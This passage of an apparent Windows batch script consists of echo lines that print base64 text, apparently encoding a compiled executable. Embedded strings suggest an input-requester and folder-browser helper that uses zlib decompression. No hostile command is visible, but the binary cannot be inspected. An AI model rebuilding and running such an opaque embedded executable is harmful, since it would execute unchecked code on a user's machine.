echo HkbpBAIAAMHrEIPiD3QqO+pzFItEJBCLzf9EJBAPtgDT4AP4g8UIi8q4AQAAANPg
echo SCPH0+8D2Cvqg/0PcyKLVCQQi80PtgLT4I1NCAP4D7ZCAdPgg8ICA/iJVCQQg8UQ
echo i0QkPItMJCwjx4sUgYvCwegID7bIiVQkUCvpD7bS0+/2whB1PfbCQA+FAAIAAIvK
echo uAEAAACLVCRQ0+CLTCQsSCPHweoQA8KLFIGLwsHoCA+2yIlUJFAr6Q+20tPv9sIQ
echo dMPBbCRQEIPiDzvqcy2LRCQQi82DxQgPtgDT4AP4i0QkEECJRCQQO+pzEA+2AIvN
echo /0QkENPgA/iDxQiLyrgBAAAA0+Ar6kgjx9PvAUQkUIvGK0QkQItUJFCJfCQkO9AP
echo hgUBAACLyivIO0wkRHYRi0QkHIO4xBsAAAAPhV8BAACLfCQgi0QkNCv5hcB1FwN8
echo JDA7y3NsK9mKB41/AYgGRkl19etZA/g7wXNCA3wkMCvIO8tzTSvZK/6NpCQAAAAA
echo igQ3iAZGSXX3i0QkNIt8JCA7w3Mti8gr2I2kJAAAAACKB41/AYgGRkl19esRO8tz
echo ESvZigeNfwGIBkZJdfWL/iv6g/sCdiyNS/24q6qqqvfh0epCD7YHg+sDiAYPtkcB
echo iEYBD7ZHAoPHA4hGAoPGA0p14YXbdBCKB4gGRoP7AXYGikcBiAZGi3wkJItUJBCL
echo XCQUO1QkOA+DnAAAADvzD4Jb/f//6Y8AAACLzivKi/8PtgGNSQOIBoPrAw+2Qf6I
echo RgEPtkH/iEYCg8YDg/sCd9+F23S2igGIBkaD+wF2rIpBAYgGRuuki0QkHPbCIItc
echo JBSLVCQQdAnHQAQ/PwAA6ziLTCRMx0EYREFBAOski0wkTItEJBzHQRhgQUEA6wuL
echo TCRMx0EYeEFBAItcJBSLVCQQx0AEUT8AAIvFK97B6AMr0MHgAyvouAEAAACLzdPg
echo i0wkTEgj+ItEJDgrwoPABYHDAQEAAIlBBItEJByJcQyJWRCJEYl4PF9eiWhAXVuD
echo xDjDzMzMzMzMzMzMzMzMzItEJAgPr0QkDFD/Fax0QQCDxATDzMzMzMzMzMzMzMzM
echo /3QkCP8VjHRBAFnDi0wkDItEJAhWi3QkCIvWhcl/GXwEhcBzE2ot99D30VqDwAFm
echo iRaNVgKD0QBRUFLoBgAAAIvGXsIMAItUJAyD7EBTi1wkTFVWi3QkUIvuV418JBBq
echo AGoKUlPoNjj//4lcJFyL2I1BMGaJB4vDg8cCC8J14IPvAo1EJBBmiw9miQ6NdgI7
echo +HXsM8BfZokGi8VeXVuDxEDCDABWi3QkCDPJhfZ0P+s2g8YEg/j5fC6D+Px+IoP4
echo /XQNg/j+dR+LRgyDxhDrBotGCIPGDFDoyP///4vI6wMzyUGFyXUHiwaD+P91w4vB
echo XsIEAIPsHItUJCAzyVWLbCQwiUwkCDvqD4S1AgAAVot0JDCF9g+EmQIAAFeLPoP/
echo /w+EdwIAAGoEWFMD8IP/+Q+E0QEAAIP/+g+EewEAAIP/+w+EJQEAAIP//A+E0wAA
echo AIP//Q+EqgAAAIP//nQxiwQvjRwXgzsAiUQkOHQO/zPoG8T//4MjAItEJDiFwA+E
echo 4QAAAFBT6JXF///p1QAAAIseA/CJXCQoiz4D8Il8JCSLBotOBIPGCIlEJBCJTCQg
echo iXQkOIXbfkSNBBeL84t8JBCJRCQYi8WLbCQYK8KJRCQci9iNBCtQUVdV6BX///+L
echo TCQgA+9OdeuLdCQ4i3wkJItcJCiLbCQ8i0QkEA+v2OlgAQAAiz4D8IseA/CLDgPw
echo jQQvUFFTjQQXUOjV/v//6UABAACLPoPGFIscL40EF4M4AIlEJDh0DP8w/xV0hkEA
echo i0QkOIXbdB1Q/3Pw/3P8/3P4/3Ps/xVchkEAagBQU/8VaIZBAGoEW+n3AAAAiz6D
echo xhCLHC+NBBeLCIlEJDiFyXQLUf8VeIZBAItEJDiF23Ql/3Ms/3MYUItDKIPoCFD/
echo FWCGQQCLRCQ4agD/MP80L/8VbIZBAGoI662LPoPGFIscL40EF4sIiUQkOIXJdAtR
echo /xV8hkEAi0QkOIXbdIf/cyRQ/3MQ/3Mg/3Mc/xVkhkEAi0QkOGoA/zD/NC//FXCG
echo QQDpXv///4s+A/CLBoscL4lEJCiNNIaNBBeDxhCDOACJRCQ4dAz/MP8VdIZBAItE
echo JDiF23QjUP9z8P9z/P9z+P9z7P8VXIZBAItL6GoAUFOJSOj/FWiGQQCLXCQojRyd
echo BAAAAItMJBQ7z30Yi8crwVCNBClQi0QkOAPBUOj2Nf//g8QMi1QkMI0MO4s+iUwk
echo FGoEWIP//w+Fjv3//1uLRCQwXzvIfRsrwVCNBClQjQQRUOsG/3QkLFVS6Lg1//+D
echo xAxeXYPEHMIQAFWL7IPsDFNWV1CLdQyLBoP4/w+E4wAAAIt9CIPGBIP4+Q+EswAA
echo AIP4+g+EmgAAAIP4+w+EgQAAAIP4/HRyg/j9dFmD+P50F4M8OAAPhJ4AAAD/NDjo
echo bMH//+mRAAAAix6LRgiLTgyLVgSDxhCJRfiJTfSJdQyF2352i3X4jQQ6iUX8i/hR
echo V+h0////i030A/5LdfGLdQyLfQjrVIsOi0YIg8YMUI0EOVDoUv///+tAiwaDxhT/
echo NDjrMIsGg8YQ/zQ4/xV4hkEA6yaLBoPGFP80OP8VfIZBAOsWiw6DxgSLBv80OY00
echo hoPGEP8VdIZBAIsGg/j/D4Ug////WF9eW4vlXcIIAFFRU4tcJBSLA4P4/w+EXQEA
echo AFWLbCQUVldqBF8D34P4+Q+E6AAAAIP4+g+EvQAAAIP4+w+ElQAAAIP4/HRsg/j9
echo dE+D+P4PhRIBAACLMwPfiwsD34sDA9+JRCQQiwMD34lEJBSJXCQghfYPju4AAACN
echo PCmL2ItsJBBTV+iA////A/1OdfSLXCQgi2wkHOnMAAAAiwuDwwiLAwPfUI0EKVDo
echo W////+m0AAAAiwMD3wPFUItLDItTCItzBIs7g8MQUVJWV/8VXIZBAOmQAAAAixMD
echo 34szA9+LCwPfiwMD31BRjQQqUFb/FWCGQQDrcYszA9+LQwyLSwiLUwSLO4PDEFCN
echo BC5QUVJX/xVkhkEA60+LMwPfiwsD34sDA9+JRCQQiwMD34lEJBSLAwPfiUQkIIXJ
echo fhSNVQSL+QPWiwODwwSJAo1SBE91840ELlD/dCQk/3QkHP90JBxR/xVYhkEAiwNq
echo BF+D+P8PhbD+//9fXl1bWVnCCABTVleLfCQQ/3cM/xW0dUEA/3cQ/xUQdUEAvoiG
echo QQBW/xUMdUEAiw+LRwSFyXQFiUEE6wWjhIZBAItPBIXJdASLB4kBVv8VFHVBAItf
echo COsZi/OLG/92CP9WBFZqAP81EIBBAP8VPHVBAIXbdeNXU/81EIBBAP8VPHVBAF9e
echo W8ODPYCGQQAAU1a+iIZBAHUc/xWYdUEAVqOghkEA/xUYdUEAxwWAhkEAAQAAAP81
echo oIZBAP8VkHVBAIvYhdsPhYcAAABqFGoI/zUQgEEA/xU4dUEAi9iF2w+ElwAAAFb/
echo FQx1QQChhIZBAIXAdAKJGFdWiUMEiR2EhkEA/xUUdUEAizVYdUEAjXsQagBqAGgA
echo ABAAV//WUP8VuHVBAFD/1lD/Fbx1QQBqCGr/U2h6IUEA/zeNQwxQ/xXAdUEAU/81
echo oIZBAP8VlHVBAF9qDGoA/zUQgEEA/xU4dUEAhcB0FotMJAyJSASLTCQQiUgIi0sI
echo iQiJQwheW8IIAIB8JAgAdQr/dCQE6Hr+//9ZwggAzMz/dCQE6IAx//9ZwgQAzMzM
echo U1VWi3QkEFeF9nRoi86NUQJmiwGDwQJmhcB19WoAagArymoA0flqAI1pAVVWagBo
echo 6f0AAP8VNHVBAIvYhdt0NI1LAVHoYDH//4v4g8QEhf90ImoAagBTV1VWagBo6f0A
echo AP8VNHVBAMYEOACLx19eXVvCBABqAeguMf//g8QExgAAX15dW8IEAMzMzMzMzMzM
echo /3QkBOjgMP//WcIEAMzMzFNVVot0JBBXhfZ0YovOjVECZosBg8ECZoXAdfVqAGoA
echo K8pqANH5agCNaQFVVmoAagD/FTR1QQCL2IXbdDGNSwFR6MMw//+L+IPEBIX/dB9q
echo AGoAU1dVVmoAagD/FTR1QQDGBDgAi8dfXl1bwgQAagHolDD//4PEBMYAAF9eXVvC
echo BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABuAHQAZABsAGwALgBkAGwA
echo bAAAAFJ0bEdldFZlcnNpb24AAAAAAAAAIAAAADIAMQA0ADcANAA4ADMANgA0ADgA
echo AAAAAEkAbgBwAHUAdABSAGUAcQB1AGUAcwB0AGUAcgAAAAAAUwBUAEEAVABJAEMA
echo AAAAAEUARABJAFQAAAAAAE8ASwAAAAAAQgBVAFQAVABPAE4AAAAAAFMASABFAEwA
echo TAAzADIALgBEAEwATAAAAFNIQnJvd3NlRm9yRm9sZGVyVwAAU0hHZXRQYXRoRnJv
echo bUlETGlzdFcAAAAAXABcAD8AXAAAAAAABQAAwIgxQQCMAADAtDFBAAMAAIDgMUEA
echo AgAAgBgyQQCNAADASDJBAI4AAMCIMkEAjwAAwMwyQQCQAADACDNBAJEAAMBQM0EA
echo kgAAwKgzQQCTAADAADRBAB0AAMBcNEEABgAAwIQ0QQCUAADAqDRBAJUAAMDMNEEA
echo JgAAwPA0QQAlAADASDVBAJYAAMDQNUEABAAAgAA2QQD9AADAJDZBAEkAbgB2AGEA
echo bABpAGQAIABtAGUAbQBvAHIAeQAgAGEAYwBjAGUAcwBzAAAAQQByAHIAYQB5ACAA
echo YgBvAHUAbgBkAHMAIABlAHgAYwBlAGUAZABlAGQAAABEAGUAYgB1AGcAZwBlAHIA
echo IABiAHIAZQBhAGsAcABvAGkAbgB0ACAAcgBlAGEAYwBoAGUAZAAAAE0AaQBzAGEA
echo bABpAGcAbgBlAGQAIABkAGEAdABhACAAYQBjAGMAZQBzAHMAAAAAAEQAZQBuAG8A
echo cgBtAGEAbAAgAGYAbABvAGEAdABpAG4AZwAtAHAAbwBpAG4AdAAgAG8AcABlAHIA
echo YQBuAGQAAABEAGkAdgBpAHMAaQBvAG4AIABiAHkAIAB6AGUAcgBvACAAKABmAGwA
echo bwBhAHQAaQBuAGcALQBwAG8AaQBuAHQAKQAAAEkAbgBlAHgAYQBjAHQAIABmAGwA
echo bwBhAHQAaQBuAGcALQBwAG8AaQBuAHQAIAByAGUAcwB1AGwAdAAAAEkAbgB2AGEA
echo bABpAGQAIABmAGwAbwBhAHQAaQBuAGcALQBwAG8AaQBuAHQAIABvAHAAZQByAGEA
echo dABpAG8AbgAAAAAAAAAAAEYAbABvAGEAdABpAG4AZwAtAHAAbwBpAG4AdAAgAG8A
echo dgBlAHIAZgBsAG8AdwAgACgAZQB4AHAAbwBuAGUAbgB0ACAAdABvACAAZwByAGUA
echo YQB0ACkAAABGAGwAbwBhAHQAaQBuAGcALQBwAG8AaQBuAHQAIABzAHQAYQBjAGsA
echo IABvAHYAZQByAGYAbABvAHcAIABvAHIAIAB1AG4AZABlAHIAZgBsAG8AdwAAAAAA
echo RgBsAG8AYQB0AGkAbgBnAC0AcABvAGkAbgB0ACAAdQBuAGQAZQByAGYAbABvAHcA
echo IAAoAGUAeABwAG8AbgBlAG4AdAAgAHQAbwBvACAAcwBtAGEAbABsACkAAABJAGwA
echo bABlAGcAYQBsACAAaQBuAHMAdAByAHUAYwB0AGkAbwBuAAAATQBlAG0AbwByAHkA
echo IABwAGEAZwBlACAAZQByAHIAbwByAAAARABpAHYAaQBzAGkAbwBuACAAYgB5ACAA
echo egBlAHIAbwAgAAAASQBuAHQAZQBnAGUAcgAgAG8AdgBlAHIAZgBsAG8AdwAAAAAA
echo RQB4AGMAZQBwAHQAaQBvAG4AIABoAGEAbgBkAGwAZQByACAAcgBlAHQAdQByAG4A
echo ZQBkACAAdQBuAGsAbgBvAHcAbgAgAHYAYQBsAHUAZQAAAAAAAAAAAEUAeABjAGUA
echo cAB0AGkAbwBuACAAaABhAG4AZABsAGUAcgAgAHQAcgBpAGUAZAAgAHQAbwAgAGMA
echo bwBuAHQAaQBuAHUAZQAgAGEAZgB0AGUAcgAgAG4AbwBuAC0AYwBvAG4AdABpAG4A
echo dQBhAGIAbABlACAAZQB4AGMAZQBwAHQAaQBvAG4AAABQAHIAaQB2AGkAbABlAGcA
echo ZQBkACAAaQBuAHMAdAByAHUAYwB0AGkAbwBuAAAAAABTAGkAbgBnAGwAZQAgAHMA
echo dABlAHAAIAB0AHIAYQBwAAAAAABTAHQAYQBjAGsAIABvAHYAZQByAGYAbABvAHcA
echo AAAAAFUAbgBrAG4AbwB3AG4AIABlAHIAcgBvAHIAIABjAG8AZABlAAAAAABLAGUA
echo cgBuAGUAbAAzADIALgBEAEwATAAAAAAAR2V0TG9uZ1BhdGhOYW1lVwAAAABTAGgA
echo ZQBsAGwAMwAyAC4ARABMAEwAAABTSEdldEtub3duRm9sZGVyUGF0aAAAAABcAAAA
echo RABvAHcAbgBsAG8AYQBkAHMAXAAAAAAAgAAAAAAAAAAwMTIzNDU2Nzg5YWJjZGVm
echo SwBlAHIAbgBlAGwAMwAyAC4AZABsAGwAAAAAAEluaXRPbmNlRXhlY3V0ZU9uY2UA
echo MS4yLjExAABgBwAAAAhQAAAIEAAUCHMAEgcfAAAIcAAACDAAAAnAABAHCgAACGAA
echo AAggAAAJoAAACAAAAAiAAAAIQAAACeAAEAcGAAAIWAAACBgAAAmQABMHOwAACHgA
echo AAg4AAAJ0AARBxEAAAhoAAAIKAAACbAAAAgIAAAIiAAACEgAAAnwABAHBAAACFQA
echo AAgUABUI4wATBysAAAh0AAAINAAACcgAEQcNAAAIZAAACCQAAAmoAAAIBAAACIQA
echo AAhEAAAJ6AAQBwgAAAhcAAAIHAAACZgAFAdTAAAIfAAACDwAAAnYABIHFwAACGwA
echo AAgsAAAJuAAACAwAAAiMAAAITAAACfgAEAcDAAAIUgAACBIAFQijABMHIwAACHIA
echo AAgyAAAJxAARBwsAAAhiAAAIIgAACaQAAAgCAAAIggAACEIAAAnkABAHBwAACFoA
echo AAgaAAAJlAAUB0MAAAh6AAAIOgAACdQAEgcTAAAIagAACCoAAAm0AAAICgAACIoA
echo AAhKAAAJ9AAQBwUAAAhWAAAIFgBACAAAEwczAAAIdgAACDYAAAnMABEHDwAACGYA
echo AAgmAAAJrAAACAYAAAiGAAAIRgAACewAEAcJAAAIXgAACB4AAAmcABQHYwAACH4A
echo AAg+AAAJ3AASBxsAAAhuAAAILgAACbwAAAgOAAAIjgAACE4AAAn8AGAHAAAACFEA
echo AAgRABUIgwASBx8AAAhxAAAIMQAACcIAEAcKAAAIYQAACCEAAAmiAAAIAQAACIEA
echo AAhBAAAJ4gAQBwYAAAhZAAAIGQAACZIAEwc7AAAIeQAACDkAAAnSABEHEQAACGkA
echo AAgpAAAJsgAACAkAAAiJAAAISQAACfIAEAcEAAAIVQAACBUAEAgCARMHKwAACHUA
echo AAg1AAAJygARBw0AAAhlAAAIJQAACaoAAAgFAAAIhQAACEUAAAnqABAHCAAACF0A
echo AAgdAAAJmgAUB1MAAAh9AAAIPQAACdoAEgcXAAAIbQAACC0AAAm6AAAIDQAACI0A
echo AAhNAAAJ+gAQBwMAAAhTAAAIEwAVCMMAEwcjAAAIcwAACDMAAAnGABEHCwAACGMA
echo AAgjAAAJpgAACAMAAAiDAAAIQwAACeYAEAcHAAAIWwAACBsAAAmWABQHQwAACHsA
echo AAg7AAAJ1gASBxMAAAhrAAAIKwAACbYAAAgLAAAIiwAACEsAAAn2ABAHBQAACFcA
echo AAgXAEAIAAATBzMAAAh3AAAINwAACc4AEQcPAAAIZwAACCcAAAmuAAAIBwAACIcA
echo AAhHAAAJ7gAQBwkAAAhfAAAIHwAACZ4AFAdjAAAIfwAACD8AAAneABIHGwAACG8A
echo AAgvAAAJvgAACA8AAAiPAAAITwAACf4AYAcAAAAIUAAACBAAFAhzABIHHwAACHAA
echo AAgwAAAJwQAQBwoAAAhgAAAIIAAACaEAAAgAAAAIgAAACEAAAAnhABAHBgAACFgA
echo AAgYAAAJkQATBzsAAAh4AAAIOAAACdEAEQcRAAAIaAAACCgAAAmxAAAICAAACIgA
echo AAhIAAAJ8QAQBwQAAAhUAAAIFAAVCOMAEwcrAAAIdAAACDQAAAnJABEHDQAACGQA
echo AAgkAAAJqQAACAQAAAiEAAAIRAAACekAEAcIAAAIXAAACBwAAAmZABQHUwAACHwA
echo AAg8AAAJ2QASBxcAAAhsAAAILAAACbkAAAgMAAAIjAAACEwAAAn5ABAHAwAACFIA
echo AAgSABUIowATByMAAAhyAAAIMgAACcUAEQcLAAAIYgAACCIAAAmlAAAIAgAACIIA
echo AAhCAAAJ5QAQBwcAAAhaAAAIGgAACZUAFAdDAAAIegAACDoAAAnVABIHEwAACGoA
echo AAgqAAAJtQAACAoAAAiKAAAISgAACfUAEAcFAAAIVgAACBYAQAgAABMHMwAACHYA
echo AAg2AAAJzQARBw8AAAhmAAAIJgAACa0AAAgGAAAIhgAACEYAAAntABAHCQAACF4A
echo AAgeAAAJnQAUB2MAAAh+AAAIPgAACd0AEgcbAAAIbgAACC4AAAm9AAAIDgAACI4A
echo AAhOAAAJ/QBgBwAAAAhRAAAIEQAVCIMAEgcfAAAIcQAACDEAAAnDABAHCgAACGEA
echo AAghAAAJowAACAEAAAiBAAAIQQAACeMAEAcGAAAIWQAACBkAAAmTABMHOwAACHkA
echo AAg5AAAJ0wARBxEAAAhpAAAIKQAACbMAAAgJAAAIiQAACEkAAAnzABAHBAAACFUA
echo AAgVABAIAgETBysAAAh1AAAINQAACcsAEQcNAAAIZQAACCUAAAmrAAAIBQAACIUA
echo AAhFAAAJ6wAQBwgAAAhdAAAIHQAACZsAFAdTAAAIfQAACD0AAAnbABIHFwAACG0A
echo AAgtAAAJuwAACA0AAAiNAAAITQAACfsAEAcDAAAIUwAACBMAFQjDABMHIwAACHMA
echo AAgzAAAJxwARBwsAAAhjAAAIIwAACacAAAgDAAAIgwAACEMAAAnnABAHBwAACFsA
echo AAgbAAAJlwAUB0MAAAh7AAAIOwAACdcAEgcTAAAIawAACCsAAAm3AAAICwAACIsA
echo AAhLAAAJ9wAQBwUAAAhXAAAIFwBACAAAEwczAAAIdwAACDcAAAnPABEHDwAACGcA
echo AAgnAAAJrwAACAcAAAiHAAAIRwAACe8AEAcJAAAIXwAACB8AAAmfABQHYwAACH8A
echo AAg/AAAJ3wASBxsAAAhvAAAILwAACb8AAAgPAAAIjwAACE8AAAn/ABAFAQAXBQEB
echo EwURABsFARARBQUAGQUBBBUFQQAdBQFAEAUDABgFAQIUBSEAHAUBIBIFCQAaBQEI
echo FgWBAEAFAAAQBQIAFwWBARMFGQAbBQEYEQUHABkFAQYVBWEAHQUBYBAFBAAYBQED
echo FAUxABwFATASBQ0AGgUBDBYFwQBABQAAEAARABIAAAAIAAcACQAGAAoABQALAAQA
echo DAADAA0AAgAOAAEADwAAAGluY29ycmVjdCBoZWFkZXIgY2hlY2sAAHVua25vd24g
echo Y29tcHJlc3Npb24gbWV0aG9kAABpbnZhbGlkIHdpbmRvdyBzaXplAHVua25vd24g
echo aGVhZGVyIGZsYWdzIHNldAAAAABoZWFkZXIgY3JjIG1pc21hdGNoAGludmFsaWQg
echo YmxvY2sgdHlwZQAAaW52YWxpZCBzdG9yZWQgYmxvY2sgbGVuZ3RocwAAAAB0b28g
echo bWFueSBsZW5ndGggb3IgZGlzdGFuY2Ugc3ltYm9scwBpbnZhbGlkIGNvZGUgbGVu
echo Z3RocyBzZXQAAAAAaW52YWxpZCBiaXQgbGVuZ3RoIHJlcGVhdAAAAGludmFsaWQg
echo Y29kZSAtLSBtaXNzaW5nIGVuZC1vZi1ibG9jawAAAABpbnZhbGlkIGxpdGVyYWwv
echo bGVuZ3RocyBzZXQAaW52YWxpZCBkaXN0YW5jZXMgc2V0AAAAaW52YWxpZCBsaXRl
echo cmFsL2xlbmd0aCBjb2RlAGludmFsaWQgZGlzdGFuY2UgY29kZQAAAGludmFsaWQg
echo ZGlzdGFuY2UgdG9vIGZhciBiYWNrAAAAaW5jb3JyZWN0IGRhdGEgY2hlY2sAAAAA
echo aW5jb3JyZWN0IGxlbmd0aCBjaGVjawAAAAAAAJYwB3csYQ7uulEJmRnEbQeP9Gpw
echo NaVj6aOVZJ4yiNsOpLjceR7p1eCI2dKXK0y2Cb18sX4HLbjnkR2/kGQQtx3yILBq
echo SHG5895BvoR91Noa6+TdbVG11PTHhdODVphsE8Coa2R6+WL97Mllik9cARTZbAZj
echo Yz0P+vUNCI3IIG47XhBpTORBYNVycWei0eQDPEfUBEv9hQ3Sa7UKpfqotTVsmLJC
echo 1sm720D5vKzjbNgydVzfRc8N1txZPdGrrDDZJjoA3lGAUdfIFmHQv7X0tCEjxLNW
echo mZW6zw+lvbieuAIoCIgFX7LZDMYk6Quxh3xvLxFMaFirHWHBPS1mtpBB3HYGcdsB
echo vCDSmCoQ1e+JhbFxH7W2BqXkv58z1LjooskHeDT5AA+OqAmWGJgO4bsNan8tPW0I
echo l2xkkQFcY+b0UWtrYmFsHNgwZYVOAGLy7ZUGbHulARvB9AiCV8QP9cbZsGVQ6bcS
echo 6ri+i3yIufzfHd1iSS3aFfN804xlTNT7WGGyTc5RtTp0ALyj4jC71EGl30rXldg9
echo bcTRpPv01tNq6WlD/NluNEaIZ63QuGDacy0EROUdAzNfTAqqyXwN3TxxBVCqQQIn
echo EBALvoYgDMkltWhXs4VvIAnUZrmf5GHODvneXpjJ2SkimNCwtKjXxxc9s1mBDbQu
echo O1y9t61susAgg7jttrO/mgzitgOa0rF0OUfV6q930p0VJtsEgxbccxILY+OEO2SU
echo PmptDahaanoLzw7knf8JkyeuAAqxngd9RJMP8NKjCIdo8gEe/sIGaV1XYvfLZ2WA
echo cTZsGecGa252G9T+4CvTiVp62hDMSt1nb9+5+fnvvo5DvrcX1Y6wYOij1tZ+k9Gh
echo xMLYOFLy30/xZ7vRZ1e8pt0GtT9LNrJI2isN2EwbCq/2SgM2YHoEQcPvYN9V32eo
echo 745uMXm+aUaMs2HLGoNmvKDSbyU24mhSlXcMzANHC7u5FgIiLyYFVb47usUoC72y
echo klq0KwRqs1yn/9fCMc/QtYue2Swdrt5bsMJkmybyY+yco2p1CpNtAqkGCZw/Ng7r
echo hWcHchNXAAWCSr+VFHq44q4rsXs4G7YMm47Skg2+1eW379x8Id/bC9TS04ZC4tTx
echo +LPdaG6D2h/NFr6BWya59uF3sG93R7cY5loIiHBqD//KOwZmXAsBEf+eZY9prmL4
echo 0/9rYUXPbBZ44gqg7tIN11SDBE7CswM5YSZnp/cWYNBNR2lJ23duPkpq0a7cWtbZ
echo ZgvfQPA72DdTrrypxZ673n/Pskfp/7UwHPK9vYrCusowk7NTpqO0JAU20LqTBtfN
echo KVfeVL9n2SMuemazuEphxAIbaF2UK28qN74LtKGODMMb3wVaje8CLQAAAABBMRsZ
echo gmI2MsNTLSsExWxkRfR3fYanWlbHlkFPCIrZyEm7wtGK6O/6y9n04wxPtaxNfq61
echo ji2Dns8cmIdREsJKECPZU9Nw9HiSQe9hVdeuLhTmtTfXtZgcloSDBVmYG4IYqQCb
echo 2/otsJrLNqldXXfmHGxs/98/QdSeDlrNoiSEleMVn4wgRrKnYXepvqbh6PHn0PPo
echo JIPew2Wyxdqqrl1d659GRCjMa29p/XB2rmsxOe9aKiAsCQcLbTgcEvM2Rt+yB13G
echo cVRw7TBla/T38yq7tsIxonWRHIk0oAeQ+7yfF7qNhA553qklOO+yPP9583O+SOhq
echo fRvFQTwq3lgFT3nwRH5i6YctT8LGHFTbAYoVlEC7Do2D6COmwtk4vw3FoDhM9Lsh
echo j6eWCs6WjRMJAMxcSDHXRYti+m7KU+F3VF27uhVsoKPWP42Ilw6WkVCY194RqczH
echo 0vrh7JPL+vVc12JyHeZ5a961VECfhE9ZWBIOFhkjFQ/acDgkm0EjPadr/WXmWuZ8
echo JQnLV2Q40E6jrpEB4p+KGCHMpzNg/bwqr+Ekre7QP7QtgxKfbLIJhqskSMnqFVPQ
echo KUZ++2h3ZeL2eT8vt0gkNnQbCR01KhIE8rxTS7ONSFJw3mV5Me9+YP7z5ue/wv3+
echo fJHQ1T2gy8z6NoqDuweRmnhUvLE5ZaeoS5iDOwqpmCLJ+rUJiMuuEE9d718ObPRG
echo zT/ZbYwOwnRDElrzAiNB6sFwbMGAQXfYR9c2lwbmLY7FtQClhIQbvBqKQXFbu1po
echo mOh3Q9nZbFoeTy0VX342DJwtGyfdHAA+EgCYuVMxg6CQYq6L0VO1khbF9N1X9O/E
echo lKfC79WW2fbpvAeuqI0ct2veMZwq7yqF7XlryqxIcNNvG134LipG4eE23magB8V/
echo Y1ToVCJl803l87ICpMKpG2eRhDAmoJ8puK7F5Pmf3v06zPPWe/3oz7xrqYD9WrKZ
echo Pgmfsn84hKuwJBws8RUHNTJGKh5zdzEHtOFwSPXQa1E2g0Z6d7JdY07X+ssP5uHS
echo zLXM+Y2E1+BKEpavCyONtshwoJ2JQbuERl0jAwdsOBrEPxUxhQ4OKEKYT2cDqVR+
echo wPp5VYHLYkwfxTiBXvQjmJ2nDrPclhWqGwBU5VoxT/yZYmLX2FN5zhdP4UlWfvpQ
echo lS3Xe9QczGITio0tUruWNJHoux/Q2aAG7PN+Xq3CZUdukUhsL6BTdeg2EjqpBwkj
echo alQkCCtlPxHkeaeWpUi8j2YbkaQnKoq94LzL8qGN0Oti3v3AI+/m2b3hvBT80KcN
echo P4OKJn6ykT+5JNBw+BXLaTtG5kJ6d/1btWtl3PRafsU3CVPudjhI97GuCbjwnxKh
echo M8w/inL9JJMAAAAAN2rCAW7UhANZvkYC3KgJB+vCywayfI0EhRZPBbhREw6PO9EP
echo 1oWXDeHvVQxk+RoJU5PYCAotngo9R1wLcKMmHEfJ5B0ed6IfKR1gHqwLLxubYe0a
echo wt+rGPW1aRnI8jUS/5j3E6YmsRGRTHMQFFo8FSMw/hR6jrgWTeR6F+BGTTjXLI85
echo jpLJO7n4Czo87kQ/C4SGPlI6wDxlUAI9WBdeNm99nDc2w9o1AakYNIS/VzGz1ZUw
echo 6mvTMt0BETOQ5Wskp4+pJf4x7yfJWy0mTE1iI3snoCIimeYgFfMkISi0eCof3ror
echo RmD8KXEKPij0HHEtw3azLJrI9S6tojcvwI2acPfnWHGuWR5zmTPcchwlk3crT1F2
echo cvEXdEWb1XV43Il+T7ZLfxYIDX0hYs98pHSAeZMeQnjKoAR6/crGe7AuvGyHRH5t
echo 3vo4b+mQ+m5shrVrW+x3agJSMWg1OPNpCH+vYj8VbWNmqythUcHpYNTXpmXjvWRk
echo ugMiZo1p4Gcgy9dIF6EVSU4fU0t5dZFK/GPeT8sJHE6St1pMpd2YTZiaxEav8AZH
echo 9k5ARcEkgkREMs1Bc1gPQCrmSUIdjItDUGjxVGcCM1U+vHVXCda3VozA+FO7qjpS
echo 4hR8UNV+vlHoOeJa31MgW4btZlmxh6RYNJHrXQP7KVxaRW9ebS+tX4AbNeG3cffg
echo 7s+x4tmlc+Ncszzma9n+5zJnuOUFDXrkOEom7w8g5O5WnqLsYfRg7eTiL+jTiO3p
echo ijar671caerwuBP9x9LR/J5sl/6pBlX/LBAa+ht62PtCxJ75da5c+EjpAPN/g8Ly
echo Jj2E8BFXRvGUQQn0oyvL9fqVjffN/0/2YF142Vc3utgOifzaOeM+27z1cd6Ln7Pf
echo 0iH13eVLN9zYDGvX72ap1rbY79SBsi3VBKRi0DPOoNFqcObTXRok0hD+XsUnlJzE
echo firaxklAGMfMVlfC+zyVw6KC08GV6BHAqK9Ny5/Fj8rGe8nI8RELyXQHRMxDbYbN
echo GtPAzy25As5Alq+Rd/xtkC5CK5IZKOmTnD6mlqtUZJfy6iKVxYDglPjHvJ/PrX6e
echo lhM4nKF5+p0kb7WYEwV3mUq7MZt90fOaMDWJjQdfS4xe4Q2OaYvPj+ydgIrb90KL
echo gkkEibUjxoiIZJqDvw5YguawHoDR2tyBVMyThGOmUYU6GBeHDXLVhqDQ4qmXuiCo
echo zgRmqvlupKt8eOuuSxIprxKsb60lxq2sGIHxpy/rM6Z2VXWkQT+3pcQp+KDzQzqh
echo qv18o52XvqLQc8S15xkGtL6nQLaJzYK3DNvNsjuxD7NiD0mxVWWLsGgi17tfSBW6
echo BvZTuDGckbm0it68g+AcvdpeWr/tNJi+AAAAAGVnvLiLyAmq7q+1EleXYo8y8N43
echo 3F9rJbk4153vKLTFik8IfWTgvW8BhwHXuL/WSt3YavIzd9/gVhBjWJ9XGVD6MKXo
echo FJ8Q+nH4rELIwHvfrafHZ0MIcnUmb87NcH+tlRUYES37t6Q/ntAYhyfozxpCj3Oi
echo rCDGsMlHegg+rzKgW8iOGLVnOwrQAIeyaThQLwxf7Jfi8FmFh5flPdGHhmW04Drd
echo Wk+Pzz8oM3eGEOTq43dYUg3Y7UBov1H4ofgr8MSfl0gqMCJaT1ee4vZvSX+TCPXH
